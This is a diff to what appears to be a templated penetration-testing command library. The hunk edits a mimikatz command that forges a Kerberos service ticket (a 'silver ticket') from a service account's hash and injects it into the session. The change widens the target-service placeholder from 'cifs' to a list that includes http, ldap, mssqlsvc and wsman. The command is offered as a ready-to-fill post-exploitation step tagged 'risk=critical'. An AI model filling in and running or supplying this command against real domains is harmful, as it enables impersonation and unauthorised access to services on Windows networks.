@@ -131,7 +131,7 @@ mimikatz "kerberos::golden /domain:{{DOMAIN:domain}} /sid:{{DOMAIN_SID:str}} /kr
 Forge a TGS for a specific service account.
 
 ```bash
-mimikatz "kerberos::golden /domain:{{DOMAIN:domain}} /sid:{{DOMAIN_SID:str}} /target:{{TARGET_HOST:str}} /rc4:{{SVC_HASH:str}} /user:{{TARGET_USER:str}} /service:{{SERVICE:str:cifs}} /ptt" "exit"
+mimikatz "kerberos::golden /domain:{{DOMAIN:domain}} /sid:{{DOMAIN_SID:str}} /target:{{TARGET_HOST:str}} /rc4:{{SVC_HASH:str}} /user:{{TARGET_USER:str}} /service:{{SERVICE:choice:cifs,http,host,ldap,mssqlsvc,wsman,rpcss}} /ptt" "exit"
 ```
 
 <!-- meta: risk=critical | phase=post | tags=silver,mimikatz -->
